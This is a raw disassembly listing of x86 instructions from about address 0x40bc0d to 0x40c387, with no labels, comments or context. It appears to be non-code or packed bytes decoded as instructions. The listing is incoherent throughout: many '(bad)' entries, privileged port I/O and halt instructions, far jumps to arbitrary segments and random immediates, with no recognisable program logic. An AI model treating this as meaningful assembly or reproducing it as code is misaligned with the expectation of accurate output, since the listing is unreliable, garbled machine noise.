  40bc0d:	outs   dx,BYTE PTR ds:[esi]
  40bc0e:	cmp    bh,BYTE PTR [ecx+0x733633bf]
  40bc14:	push   0xffffffe4
  40bc16:	add    eax,0x559f3542
  40bc1b:	cmp    dh,ah
  40bc1d:	mov    bl,0x1f
  40bc1f:	or     eax,0xfd665c4
  40bc24:	into   
  40bc25:	jmp    0x521:0xca268575
  40bc2c:	xlat   BYTE PTR ds:[ebx]
  40bc2d:	ins    BYTE PTR es:[edi],dx
  40bc2e:	lods   al,BYTE PTR ds:[esi]
  40bc2f:	jno    0x40bc52
  40bc31:	jo     0x40bc24
  40bc33:	aam    0x60
  40bc35:	aam    0x7c
  40bc37:	paddw  mm6,QWORD PTR [eax+esi*4-0x66735ab9]
  40bc3f:	nop
  40bc40:	xchg   ebx,eax
  40bc41:	adc    eax,0x6662773a
  40bc46:	jne    0x40bc89
  40bc48:	fxch   st(2)
  40bc4a:	xchg   esi,eax
  40bc4b:	adc    BYTE PTR [ebx+0x6e],dh
  40bc4e:	ds xchg edi,eax
  40bc50:	or     ah,bh
  40bc52:	push   esi
  40bc53:	and    al,0xc3
  40bc55:	popa   
  40bc56:	xlat   BYTE PTR ds:[ebx]
  40bc57:	stos   BYTE PTR es:[edi],al
  40bc58:	xlat   BYTE PTR ds:[ebx]
  40bc59:	sbb    eax,0xb032e377
  40bc5e:	fcmovb st,st(0)
  40bc60:	push   esp
  40bc61:	sar    DWORD PTR [ecx+0x1933fa2a],cl
  40bc67:	je     0x40bc16
  40bc69:	add    BYTE PTR [ebx+edx*8-0x43],dl
  40bc6d:	lods   al,BYTE PTR ds:[esi]
  40bc6e:	inc    esp
  40bc6f:	hlt    
  40bc70:	call   0x948aa5c2
  40bc75:	retf   
  40bc76:	add    DWORD PTR [eax+0x5f7f8eb4],ebx
  40bc7c:	xor    BYTE PTR [ebp+0x315df31c],0x79
  40bc83:	add    eax,0xc5af74c1
  40bc88:	xlat   BYTE PTR ds:[ebx]
  40bc89:	nop
  40bc8a:	data16 fucomi st,st(3)
  40bc8d:	fs nop
  40bc8f:	int    0x39
  40bc91:	fimul  WORD PTR [edx]
  40bc93:	push   esp
  40bc94:	push   esi
  40bc95:	sar    BYTE PTR [ebx+0x0],0x9
  40bc99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9a:	test   al,0x5e
  40bc9d:	test   DWORD PTR [ecx+0x10fd4c4b],esi
  40bca3:	jmp    0xa1b0:0x7f7b73ff
  40bcaa:	and    dl,cl
  40bcac:	shr    DWORD PTR [esi],0xaa
  40bcaf:	lock lds esi,FWORD PTR [ecx]
  40bcb2:	jmp    0x40bd17
  40bcb4:	dec    esi
  40bcb5:	cdq    
  40bcb6:	in     eax,0x4a
  40bcb8:	inc    eax
  40bcb9:	jo     0x40bce5
  40bcbb:	pusha  
  40bcbc:	dec    esi
  40bcbd:	xchg   esp,eax
  40bcbe:	adc    DWORD PTR [ebx+0x515f9e97],ebx
  40bcc4:	arpl   WORD PTR [ebx],bp
  40bcc6:	aad    0x3e
  40bcc8:	add    DWORD PTR [ebx],esp
  40bcca:	out    0xae,eax
  40bccc:	mov    bh,0x91
  40bcce:	pop    eax
  40bccf:	dec    edi
  40bcd0:	gs xchg ebp,eax
  40bcd2:	jge    0x40bca0
  40bcd4:	sub    dh,BYTE PTR [esi+eiz*1+0x1d75a204]
  40bcdb:	adc    dl,cl
  40bcdd:	outs   dx,DWORD PTR ds:[esi]
  40bcde:	dec    esp
  40bcdf:	(bad)  
  40bce0:	pop    edi
  40bce1:	pop    ds
  40bce2:	xor    eax,0xfe8eb0e0
  40bce7:	jg     0x40bd05
  40bce9:	cmc    
  40bcea:	mov    esi,DWORD PTR [eax+edx*4+0xb33a6f9]
  40bcf1:	out    dx,al
  40bcf2:	clc    
  40bcf3:	ss mov ecx,0x70504747
  40bcf9:	nop
  40bcfa:	add    BYTE PTR [ebp-0x68],ch
  40bcfd:	pop    esi
  40bcfe:	out    0x92,eax
  40bd00:	dec    esp
  40bd01:	repz (bad) 
  40bd03:	mov    edi,0xbb616738
  40bd08:	jno    0x40bd62
  40bd0a:	repnz cmc 
  40bd0c:	retf   
  40bd0d:	sahf   
  40bd0e:	sbb    al,0xca
  40bd10:	adc    edx,DWORD PTR [edx]
  40bd12:	icebp  
  40bd13:	mov    eax,0x74fdb8d8
  40bd18:	add    BYTE PTR [edi+0x56650fa8],0xf2
  40bd1f:	ret    0xc2e8
  40bd22:	ror    dh,0xc3
  40bd25:	popf   
  40bd26:	loope  0x40bd79
  40bd28:	add    dl,ah
  40bd2a:	jns    0x40bd8f
  40bd2c:	add    BYTE PTR [ebp+0x72],dl
  40bd2f:	(bad)  
  40bd30:	cmp    BYTE PTR [esi+0x6ce0cafe],ah
  40bd36:	jp     0x40bd38
  40bd38:	mov    ebx,0x7bdb332f
  40bd3d:	mov    DWORD PTR [ecx-0x14],edx
  40bd40:	sbb    eax,0xe8d0036f
  40bd45:	dec    edi
  40bd46:	xchg   ecx,eax
  40bd47:	out    dx,al
  40bd48:	push   edi
  40bd49:	mov    DWORD PTR [ecx],edi
  40bd4b:	(bad)  
  40bd4d:	(bad)  
  40bd4f:	jle    0x40bd8a
  40bd51:	fld    QWORD PTR [ecx+0x451cf2f9]
  40bd57:	mov    dh,0x4
  40bd59:	inc    ebp
  40bd5a:	std    
  40bd5b:	push   ecx
  40bd5c:	das    
  40bd5d:	jmp    ecx
  40bd5f:	(bad)  
  40bd60:	iret   
  40bd61:	jne    0x40bdd0
  40bd63:	test   al,dh
  40bd65:	(bad)  
  40bd66:	mov    al,ds:0xffbae4bf
  40bd6b:	jno    0x40bd98
  40bd6d:	push   0xffffffc8
  40bd6f:	xor    bl,BYTE PTR ss:[esi]
  40bd72:	adc    ecx,DWORD PTR [esi+0x285e4f36]
  40bd78:	in     al,dx
  40bd79:	add    al,0xc7
  40bd7b:	fidivr WORD PTR [esi+0x6c4c6024]
  40bd81:	sbb    DWORD PTR [ebx+0x21c8d946],eax
  40bd87:	mov    ch,0x26
  40bd89:	push   ss
  40bd8a:	mov    ch,0x3a
  40bd8c:	xlat   BYTE PTR ds:[ebx]
  40bd8d:	js     0x40bdd4
  40bd8f:	retf   0xd04f
  40bd92:	pusha  
  40bd93:	inc    edx
  40bd94:	into   
  40bd95:	adc    al,0x8b
  40bd97:	adc    eax,0xda7719ed
  40bd9c:	or     al,BYTE PTR [ebx]
  40bd9e:	mov    edx,0x5c0187f9
  40bda3:	sahf   
  40bda4:	lea    esp,[esp+edx*8+0x5dc12bb6]
  40bdab:	into   
  40bdac:	in     al,dx
  40bdad:	cs push 0x0
  40bdb0:	mov    eax,ds:0xae9bb061
  40bdb5:	sub    BYTE PTR [ebp+0xe7eb027],ah
  40bdbb:	sbb    eax,0x1c7cdb19
  40bdc0:	push   esp
  40bdc1:	lods   eax,DWORD PTR ds:[esi]
  40bdc2:	in     eax,dx
  40bdc3:	pop    ecx
  40bdc4:	shl    DWORD PTR [eax-0x80],cl
  40bdc7:	out    0x72,al
  40bdc9:	test   eax,edi
  40bdcb:	dec    esp
  40bdcc:	(bad)  
  40bdcd:	pop    ebp
  40bdce:	jl     0x40bda4
  40bdd0:	push   ss
  40bdd1:	mov    edi,0xe5206f82
  40bdd6:	mov    ds:0xafb80bea,al
  40bddb:	jno    0x40be53
  40bddd:	fsubr  QWORD PTR [eax+0x3b275e96]
  40bde3:	mov    ah,0x73
  40bde5:	xor    edx,DWORD PTR [ebp+0x35]
  40bde8:	dec    edi
  40bde9:	loop   0x40be0f
  40bdeb:	mov    ecx,DWORD PTR [edi+esi*2-0x744e7328]
  40bdf2:	jp     0x40bdb0
  40bdf4:	test   DWORD PTR [edi+0x5afbff87],ecx
  40bdfa:	mov    ch,0xa7
  40bdfc:	xchg   esp,eax
  40bdfd:	adc    esi,esp
  40bdff:	mov    ebp,0xbb5dc655
  40be04:	jge    0x40be15
  40be06:	test   DWORD PTR [eax-0x1d],ecx
  40be09:	sub    DWORD PTR [esi+0x20ee9b04],esi
  40be0f:	mov    dh,0x95
  40be11:	ins    BYTE PTR es:[edi],dx
  40be12:	aad    0x79
  40be14:	sbb    eax,0x9c0c20e0
  40be19:	js     0x40bdd8
  40be1b:	inc    ebx
  40be1c:	loopne 0x40be3b
  40be1e:	xlat   BYTE PTR ds:[ebx]
  40be1f:	push   cs
  40be20:	stos   DWORD PTR es:[edi],eax
  40be21:	xchg   edi,eax
  40be22:	sbb    ch,BYTE PTR [esi+eax*1-0x4ace4e80]
  40be29:	sbb    eax,0xbebeca4d
  40be2e:	sub    eax,0xa3cc4727
  40be33:	loop   0x40be9c
  40be35:	sti    
  40be36:	bound  edi,QWORD PTR [ecx-0x2bfdc199]
  40be3c:	or     BYTE PTR [ecx-0x4c],dh
  40be3f:	ins    BYTE PTR es:[edi],dx
  40be40:	out    dx,eax
  40be41:	sar    DWORD PTR [ecx],cl
  40be43:	sub    cl,BYTE PTR [esi+0x399483c4]
  40be49:	test   DWORD PTR [edi+eiz*8],0xde1075e9
  40be50:	mov    ah,0xf9
  40be52:	popa   
  40be53:	ds scas al,BYTE PTR es:[edi]
  40be55:	inc    edi
  40be56:	add    DWORD PTR [ebx+0x7b],0x7
  40be5a:	hlt    
  40be5b:	pusha  
  40be5c:	or     BYTE PTR [eax],bl
  40be5e:	xor    DWORD PTR [ecx],edx
  40be60:	mov    cl,0x5e
  40be62:	push   edi
  40be63:	loop   0x40be50
  40be65:	ins    BYTE PTR es:[edi],dx
  40be66:	add    DWORD PTR [eax+0x77caea48],0xbc0cc9ed
  40be70:	mov    al,ds:0x6d92c515
  40be75:	adc    ebx,DWORD PTR [ecx]
  40be77:	inc    edx
  40be78:	call   0xf54f820e
  40be7d:	mov    ebx,DWORD PTR [ebx+0x448d759d]
  40be83:	sbb    dh,BYTE PTR [eax+0x7afb4f8a]
  40be89:	mov    dh,0x5a
  40be8b:	stos   DWORD PTR es:[edi],eax
  40be8c:	sti    
  40be8d:	loop   0x40bec6
  40be8f:	mov    esi,0xbd6a4af
  40be94:	imul   esp,DWORD PTR [edx+0x19],0xffffffad
  40be98:	mov    ecx,0xe1a06386
  40be9d:	aad    0x78
  40be9f:	pop    ecx
  40bea0:	pusha  
  40bea1:	aam    0x5f
  40bea3:	sbb    BYTE PTR [eax],al
  40bea5:	ins    BYTE PTR es:[edi],dx
  40bea6:	ret    0x5131
  40bea9:	cli    
  40beaa:	scas   al,BYTE PTR es:[edi]
  40beab:	pop    ds
  40beac:	mov    ds:0xbc2b6156,al
  40beb1:	and    al,0xb5
  40beb3:	sbb    eax,0xaf0b1ddf
  40beb8:	(bad)  
  40beba:	pop    edx
  40bebb:	mov    ds:0xe9686a13,al
  40bec0:	or     dh,BYTE PTR [esi+0x75ae7ff5]
  40bec6:	inc    esi
  40bec7:	inc    ebp
  40bec8:	sbb    al,BYTE PTR [edi-0x2978e9a4]
  40bece:	imul   esi,DWORD PTR [eax],0x5d20315d
  40bed4:	inc    esp
  40bed5:	and    BYTE PTR [esi+0x68c39671],cl
  40bedb:	call   0x6ccf:0x8f102594
  40bee2:	xchg   DWORD PTR [esi],ebx
  40bee4:	ret    
  40bee5:	sub    al,0xb8
  40bee7:	mov    ch,0x46
  40bee9:	in     eax,dx
  40beea:	or     eax,ecx
  40beec:	xchg   esp,eax
  40beed:	mov    ebp,0x65a22bda
  40bef2:	sahf   
  40bef3:	clc    
  40bef4:	pop    ebx
  40bef5:	sub    eax,0xd7284288
  40befa:	dec    esi
  40befb:	neg    BYTE PTR ds:0xe1f8a5f5
  40bf01:	outs   dx,DWORD PTR ds:[esi]
  40bf02:	push   0xa16c4d65
  40bf07:	mov    esp,0xf607d180
  40bf0c:	push   ss
  40bf0d:	mov    ebp,0xb367bab9
  40bf12:	sar    DWORD PTR [edx],cl
  40bf14:	div    DWORD PTR [edx-0x7b]
  40bf17:	sub    dh,BYTE PTR [esi]
  40bf19:	scas   al,BYTE PTR es:[edi]
  40bf1a:	lods   al,BYTE PTR ds:[esi]
  40bf1b:	cmovge eax,DWORD PTR ds:0xb5927f20
  40bf22:	call   0x3248:0xf0043c16
  40bf29:	div    cl
  40bf2b:	push   eax
  40bf2c:	cmc    
  40bf2d:	mov    al,0x0
  40bf2f:	shl    BYTE PTR [edx+0x15],cl
  40bf32:	cmp    eax,0x33148478
  40bf37:	in     al,0x41
  40bf39:	test   eax,0xc00b4964
  40bf3e:	cmc    
  40bf3f:	je     0x40bef1
  40bf41:	xchg   ebx,eax
  40bf42:	xchg   BYTE PTR [esi+ebx*4],bl
  40bf45:	(bad)
  40bf48:	call   0xa97f1180
  40bf4d:	xchg   esp,eax
  40bf4e:	adc    ecx,ebp
  40bf50:	xchg   BYTE PTR [ebp+0x7615f77a],ah
  40bf56:	xchg   ah,al
  40bf58:	enter  0xa632,0x51
  40bf5c:	pop    edx
  40bf5d:	or     edx,esi
  40bf5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf60:	je     0x40bf47
  40bf62:	ja     0x40bef5
  40bf64:	(bad)  
  40bf65:	lock cmp eax,0x8087035d
  40bf6b:	jns    0x40bf19
  40bf6d:	push   ss
  40bf6e:	out    dx,eax
  40bf6f:	mov    ds:0xefae22a2,eax
  40bf74:	adc    esi,DWORD PTR [edi+0x5aaf4c45]
  40bf7a:	or     BYTE PTR [ebx-0x2cf2a61a],cl
  40bf80:	jo     0x40bf7a
  40bf82:	jg     0x40bf67
  40bf84:	mov    dl,0xc9
  40bf86:	push   ebp
  40bf87:	mov    dh,0x10
  40bf89:	in     al,dx
  40bf8a:	sbb    eax,0x95e72425
  40bf8f:	sbb    al,0x2d
  40bf91:	or     ch,BYTE PTR [eax-0x7da54e9]
  40bf97:	dec    esi
  40bf98:	pop    ebx
  40bf99:	addr16 adc eax,0xa9be6acc
  40bf9f:	xor    DWORD PTR [esi],0x7c7ffd50
  40bfa5:	into   
  40bfa6:	(bad)  
  40bfa7:	mov    ds:0xc56b7157,al
  40bfac:	mov    WORD PTR [edi+0x10d028f9],?
  40bfb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb3:	xor    BYTE PTR [ecx+0x20b2fb8e],ah
  40bfb9:	ret    
  40bfba:	das    
  40bfbb:	or     DWORD PTR [ecx],esp
  40bfbd:	xchg   edx,eax
  40bfbe:	mov    esi,0x3c68c84c
  40bfc3:	les    edx,FWORD PTR [eax]
  40bfc5:	sti    
  40bfc6:	inc    ebp
  40bfc7:	daa    
  40bfc8:	cld    
  40bfc9:	data16 js 0x40c03a
  40bfcc:	ficomp WORD PTR [edi]
  40bfce:	loopne 0x40bfec
  40bfd0:	(bad)  
  40bfd1:	mov    ds:0x9b7683e5,eax
  40bfd6:	fimul  WORD PTR [ecx]
  40bfd8:	fdivr  QWORD PTR [ebx-0x21408534]
  40bfde:	ins    DWORD PTR es:[edi],dx
  40bfdf:	mov    ds:0xf6acbb74,al
  40bfe4:	inc    edi
  40bfe5:	imul   esi,DWORD PTR [ecx+0x67],0x1c
  40bfe9:	aas    
  40bfea:	push   0x5a
  40bfec:	xchg   ebp,eax
  40bfed:	mov    dh,0x88
  40bfef:	pushf  
  40bff0:	inc    edx
  40bff1:	sbb    al,ah
  40bff3:	mov    ah,0x0
  40bff5:	loop   0x40bfb6
  40bff7:	jle    0x40c014
  40bff9:	ret    0xaa95
  40bffc:	sbb    eax,0x96c475c
  40c001:	fst    DWORD PTR es:[ebx-0xd46ca57]
  40c008:	iret   
  40c009:	pusha  
  40c00a:	pop    eax
  40c00b:	in     al,0xc4
  40c00d:	push   0x2174c269
  40c012:	pop    es
  40c013:	jo     0x40bfe4
  40c015:	cmp    al,0x58
  40c017:	pop    ebx
  40c018:	addr16 (bad) 
  40c01b:	pop    eax
  40c01c:	xchg   ecx,eax
  40c01d:	in     al,0x6
  40c01f:	outs   dx,DWORD PTR ds:[esi]
  40c020:	je     0x40c021
  40c022:	mov    ds:0xf3fc5397,eax
  40c027:	cmp    DWORD PTR [ecx+0x6da6740d],eax
  40c02d:	jbe    0x40c002
  40c02f:	scas   al,BYTE PTR es:[edi]
  40c030:	mov    ch,0xf8
  40c032:	xor    eax,0xf427c527
  40c037:	in     eax,dx
  40c038:	xchg   ebx,eax
  40c039:	mov    eax,ds:0x6b92f8ab
  40c03e:	pop    edi
  40c03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c040:	shl    DWORD PTR [edi+0x65b08a8e],0x20
  40c047:	push   0xac00f557
  40c04c:	mov    BYTE PTR [ebx+0x51d7cba0],ah
  40c052:	es push ecx
  40c054:	sbb    DWORD PTR [ebx-0x59],esi
  40c057:	adc    ebp,0xeb212d58
  40c05d:	dec    ebp
  40c05e:	loopne 0x40bff6
  40c060:	jno    0x40c069
  40c062:	out    0x63,al
  40c064:	dec    esi
  40c065:	inc    esi
  40c066:	sbb    al,BYTE PTR [ebp-0x15561dc4]
  40c06c:	callw  0x820a
  40c070:	cmp    DWORD PTR [ebx+0x51d79257],edx
  40c076:	pop    ecx
  40c077:	mov    BYTE PTR [ebp-0x14],al
  40c07a:	rcr    BYTE PTR [ebx+0x69],1
  40c07d:	out    dx,eax
  40c07e:	(bad)  [eax]
  40c080:	in     eax,0xe8
  40c082:	pusha  
  40c083:	jle    0x40c020
  40c085:	xchg   BYTE PTR [eax],bh
  40c087:	test   al,0xae
  40c089:	test   ah,bh
  40c08b:	xor    edx,ebx
  40c08d:	jns    0x40c02e
  40c08f:	mov    ah,0x2e
  40c091:	or     DWORD PTR [edx],esi
  40c093:	cs mov esp,0x6f809331
  40c099:	inc    ecx
  40c09a:	leave  
  40c09b:	adc    esp,esp
  40c09d:	(bad)  
  40c09e:	sub    BYTE PTR [eax],al
  40c0a0:	pop    ds
  40c0a1:	adc    esp,DWORD PTR [eax]
  40c0a3:	xor    ah,BYTE PTR [eax+0x3f]
  40c0a6:	mov    bl,cl
  40c0a8:	(bad)  
  40c0a9:	sar    BYTE PTR [ecx+0x4e],cl
  40c0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0ad:	(bad)  
  40c0ae:	lods   al,BYTE PTR ds:[esi]
  40c0af:	pop    esi
  40c0b0:	mov    ds:0x6507ef61,al
  40c0b5:	inc    esp
  40c0b6:	cmp    eax,0x920b0b7b
  40c0bb:	adc    eax,0xb97facc1
  40c0c0:	fld    TBYTE PTR [ecx]
  40c0c2:	popf   
  40c0c3:	sahf   
  40c0c4:	inc    esi
  40c0c5:	loope  0x40c051
  40c0c7:	sahf   
  40c0c8:	in     al,0x30
  40c0ca:	inc    ebp
  40c0cb:	inc    edx
  40c0cc:	ss pop edx
  40c0ce:	sub    DWORD PTR [ecx-0x28],edx
  40c0d1:	xor    esp,DWORD PTR [edx-0x1e]
  40c0d4:	mov    DWORD PTR [ebx+eiz*2-0x2a],ecx
  40c0d8:	and    eax,0xe155ef79
  40c0dd:	pop    bx
  40c0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e0:	sbb    DWORD PTR [ecx],esi
  40c0e2:	push   esi
  40c0e3:	sbb    DWORD PTR [esi+0x6a],ebx
  40c0e6:	jno    0x40c0f5
  40c0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e9:	mov    bl,0xcb
  40c0eb:	int    0xc0
  40c0ed:	cdq    
  40c0ee:	nop
  40c0ef:	dec    edx
  40c0f0:	out    0x15,al
  40c0f2:	pop    ebx
  40c0f3:	add    eax,0x6d9727ba
  40c0f8:	jmp    0xcdc3:0xd3749b32
  40c0ff:	neg    dl
  40c101:	push   eax
  40c102:	pop    es
  40c103:	adc    eax,0xab24c19
  40c108:	sub    ebx,DWORD PTR ds:0x43c49583
  40c10e:	mov    al,ds:0x9012698b
  40c113:	sub    eax,0x57f24133
  40c118:	fldcw  WORD PTR [ebx]
  40c11a:	scas   al,BYTE PTR es:[edi]
  40c11b:	pop    ds
  40c11c:	(bad)  
  40c11d:	jmp    0xee6c:0xfaa855ab
  40c124:	sub    ebx,ecx
  40c126:	and    bh,BYTE PTR [edx+0x76]
  40c129:	inc    esp
  40c12a:	icebp  
  40c12b:	or     DWORD PTR [edx+ecx*8-0x3b],0xd9fa118b
  40c133:	cdq    
  40c134:	adc    DWORD PTR [ebx],esi
  40c136:	add    esi,DWORD PTR [eax+edi*2]
  40c139:	outs   dx,DWORD PTR ds:[esi]
  40c13a:	push   edx
  40c13b:	sbb    cl,BYTE PTR [eax+ebp*2]
  40c13e:	dec    ecx
  40c13f:	cmp    DWORD PTR [esi-0x831b1c],esi
  40c145:	rol    DWORD PTR [esi+0x11],0x3
  40c149:	mov    DWORD PTR [edx-0x7a047c94],ebx
  40c14f:	jnp    0x40c0e1
  40c151:	test   al,0xc4
  40c153:	cli    
  40c154:	jmp    0x40c14d
  40c156:	xor    esp,eax
  40c158:	or     dl,0xdc
  40c15b:	or     eax,0x5dadb11d
  40c160:	nop
  40c161:	push   0x67
  40c163:	(bad)  
  40c164:	lock test al,0x5
  40c167:	enter  0xfc3f,0x32
  40c16b:	mov    bh,0xcc
  40c16d:	lahf   
  40c16e:	loop   0x40c158
  40c170:	fstp   TBYTE PTR [ecx+0x5deb877]
  40c176:	add    al,0x17
  40c178:	cmovl  esi,DWORD PTR [ecx+0x3a]
  40c17c:	jp     0x40c156
  40c17e:	scas   al,BYTE PTR es:[edi]
  40c17f:	test   DWORD PTR [esi+0x2ae1eb60],ebp
  40c185:	jo     0x40c121
  40c187:	test   DWORD PTR [ebx+0x32],0x24d85ffe
  40c18e:	dec    eax
  40c18f:	scas   eax,DWORD PTR es:[edi]
  40c190:	les    esi,FWORD PTR [ebx]
  40c192:	loope  0x40c1d3
  40c194:	xchg   eax,ebx
  40c196:	lods   al,BYTE PTR ds:[esi]
  40c197:	test   bl,ch
  40c199:	int    0xa8
  40c19b:	fcom   DWORD PTR [eax-0x1ad64ab4]
  40c1a1:	adc    al,0xed
  40c1a3:	push   ecx
  40c1a4:	in     al,0x11
  40c1a6:	daa    
  40c1a7:	test   edx,ebp
  40c1a9:	sbb    al,BYTE PTR [edx+0x4a262ff7]
  40c1af:	dec    esi
  40c1b0:	retf   
  40c1b1:	add    ebx,esp
  40c1b3:	shl    cl,0xee
  40c1b6:	fwait
  40c1b7:	aad    0xe7
  40c1b9:	div    al
  40c1bb:	adc    dh,dl
  40c1bd:	into   
  40c1be:	jmp    DWORD PTR [ecx-0x3eb3b30f]
  40c1c4:	pop    ebx
  40c1c5:	fisubr WORD PTR [ecx-0x58cef178]
  40c1cb:	sbb    eax,0x945bb239
  40c1d0:	out    dx,al
  40c1d1:	nop
  40c1d2:	out    0x5f,al
  40c1d4:	inc    edx
  40c1d5:	sbb    eax,0xb616485f
  40c1da:	mov    ch,0xf8
  40c1dc:	or     eax,0xffffffbe
  40c1df:	(bad)  
  40c1e0:	mov    ds:0x814e5599,eax
  40c1e5:	mov    edx,0x3fdf96d0
  40c1ea:	fidiv  DWORD PTR [ebx+ecx*4]
  40c1ed:	inc    ecx
  40c1ee:	xchg   edx,eax
  40c1ef:	pusha  
  40c1f0:	jbe    0x40c266
  40c1f2:	fidiv  WORD PTR [esi+0x18]
  40c1f5:	ret    0xfece
  40c1f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1f9:	adc    BYTE PTR [esi*2-0x20837a0],ch
  40c200:	and    dl,BYTE PTR [edx-0x1f]
  40c203:	jl     0x40c1dd
  40c205:	lods   al,BYTE PTR ds:[esi]
  40c206:	xlat   BYTE PTR ds:[ebx]
  40c207:	dec    edi
  40c208:	repz inc esp
  40c20a:	ins    DWORD PTR es:[edi],dx
  40c20b:	scas   al,BYTE PTR es:[edi]
  40c20c:	iret   
  40c20d:	pop    esi
  40c20e:	ret    0xc535
  40c211:	mov    esi,0xf4fba72c
  40c216:	jge    0x40c280
  40c218:	hlt    
  40c219:	sub    DWORD PTR [esi+0x32d28482],0xffffff82
  40c220:	jno    0x40c1f6
  40c222:	inc    esi
  40c223:	add    DWORD PTR [esi],0xffffff9a
  40c226:	fcmovnb st,st(2)
  40c228:	jmp    0x492fea22
  40c22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c22e:	jmp    0x1e76:0x426bbe28
  40c235:	or     cl,BYTE PTR [esi-0x61d85217]
  40c23b:	cmp    eax,DWORD PTR [ebx]
  40c23d:	push   ebp
  40c23e:	fbstp  TBYTE PTR [edx]
  40c240:	sahf   
  40c241:	(bad)  
  40c242:	out    dx,al
  40c243:	mov    al,0x6c
  40c245:	lds    eax,FWORD PTR [ebx]
  40c247:	cmp    al,dl
  40c249:	pop    ebp
  40c24a:	cli    
  40c24b:	mov    fs,ebp
  40c24d:	fmul   DWORD PTR [edi]
  40c24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c250:	push   ds
  40c251:	fdivr  st(4),st
  40c253:	(bad)  
  40c254:	mov    eax,ds:0x78741908
  40c259:	add    bl,bh
  40c25b:	push   eax
  40c25c:	test   BYTE PTR [esp+ecx*2],0x6
  40c260:	cli    
  40c261:	mov    dl,0x99
  40c263:	add    DWORD PTR [ebx],edi
  40c265:	imul   ecx,DWORD PTR [ecx],0x19
  40c268:	cmp    bh,BYTE PTR [edi]
  40c26a:	pop    ebx
  40c26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c26c:	call   0xb794:0xb2d0be77
  40c273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c274:	fs dec ebp
  40c276:	jmp    0x40c21d
  40c278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c279:	or     ebp,DWORD PTR [esi-0x6f]
  40c27c:	loop   0x40c21f
  40c27e:	out    dx,al
  40c27f:	or     dh,BYTE PTR [esi-0x4e8dc3dd]
  40c285:	dec    eax
  40c286:	out    0xe1,eax
  40c288:	and    edx,DWORD PTR [ecx+0x788209fa]
  40c28e:	rol    DWORD PTR [bp-0x6e],1
  40c292:	xor    bl,BYTE PTR [edi-0x25]
  40c295:	dec    ebp
  40c296:	out    0x41,eax
  40c298:	dec    ebx
  40c299:	call   0xacea:0x89137ee6
  40c2a0:	fadd   DWORD PTR [ecx+0x60]
  40c2a3:	daa    
  40c2a4:	test   esp,ecx
  40c2a6:	sub    esi,DWORD PTR [eax+0xb7ddf4c]
  40c2ac:	enter  0xa8a8,0x17
  40c2b0:	popf   
  40c2b1:	int3   
  40c2b2:	add    eax,0xf6b9c3cf
  40c2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2b8:	imul   esi,DWORD PTR [edi-0x79],0xc9b2b97
  40c2bf:	repz jae 0x40c279
  40c2c2:	xor    esp,edi
  40c2c4:	mov    bh,0x1a
  40c2c6:	in     al,0x27
  40c2c8:	imul   esi,esp,0xb66c3afe
  40c2ce:	jns    0x40c2ea
  40c2d0:	pop    edx
  40c2d1:	jp     0x40c342
  40c2d3:	mov    BYTE PTR [ebp+0x15f8e74],al
  40c2d9:	xor    BYTE PTR [ebp+0x1a],ch
  40c2dc:	(bad)  
  40c2dd:	xchg   ebp,eax
  40c2de:	rcl    BYTE PTR [ecx-0x1520e091],cl
  40c2e4:	loopne 0x40c33e
  40c2e6:	sub    DWORD PTR [edx],esp
  40c2e8:	shr    DWORD PTR [esi-0x28],0x28
  40c2ec:	mov    ecx,0x47887bc9
  40c2f1:	mov    ah,0x23
  40c2f3:	pop    ebx
  40c2f4:	cmp    ecx,DWORD PTR [eax+0x473d3914]
  40c2fa:	fistp  QWORD PTR [esi+0x23]
  40c2fd:	out    0x48,eax
  40c2ff:	pop    ds
  40c300:	ins    BYTE PTR es:[edi],dx
  40c301:	push   edx
  40c302:	sbb    edx,ecx
  40c304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c305:	test   DWORD PTR [eax-0x602dd335],ebx
  40c30b:	lahf   
  40c30c:	dec    ebx
  40c30d:	test   esp,eax
  40c30f:	push   eax
  40c310:	or     ch,cl
  40c312:	mov    ds:0x3267f3cf,al
  40c317:	fisubr DWORD PTR [ebx]
  40c319:	or     ch,BYTE PTR [ecx+0x429aab65]
  40c31f:	push   edx
  40c320:	inc    ecx
  40c321:	mov    cl,0xf4
  40c323:	inc    eax
  40c324:	and    al,0x92
  40c326:	mov    ecx,0x222d1b08
  40c32b:	bound  ebx,QWORD PTR ds:0x300db4aa
  40c331:	gs div edx
  40c334:	(bad)  
  40c336:	jns    0x40c2bf
  40c338:	movzx  edi,WORD PTR [ebp-0x5]
  40c33c:	sub    al,0xdb
  40c33e:	push   0x54
  40c340:	les    esp,FWORD PTR [edi-0x58]
  40c343:	aas    
  40c344:	push   ecx
  40c345:	sub    al,0x2e
  40c347:	xchg   BYTE PTR [eax+esi*4],ah
  40c34a:	lahf   
  40c34b:	outs   dx,DWORD PTR ds:[esi]
  40c34c:	(bad)  
  40c34d:	mov    eax,gs
  40c34f:	xor    eax,0x791013c9
  40c354:	sbb    DWORD PTR [ebp+0x18],ebp
  40c357:	and    ah,al
  40c359:	adc    ebp,DWORD PTR [edi+0x2b10bbf1]
  40c35f:	pop    esp
  40c360:	test   al,0x62
  40c362:	push   0x1a
  40c364:	das    
  40c365:	cmp    eax,DWORD PTR [ecx+eiz*2-0x23af3225]
  40c36c:	(bad)  
  40c36d:	or     al,0x45
  40c36f:	shr    BYTE PTR [eax-0x1476a7a7],cl
  40c375:	add    bh,BYTE PTR [ebp+0x6ad3fab9]
  40c37b:	enterw 0x3d12,0xe7
  40c380:	scas   eax,DWORD PTR es:[edi]
  40c381:	mov    ecx,0xf738c990
  40c386:	inc    esp
  40c387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
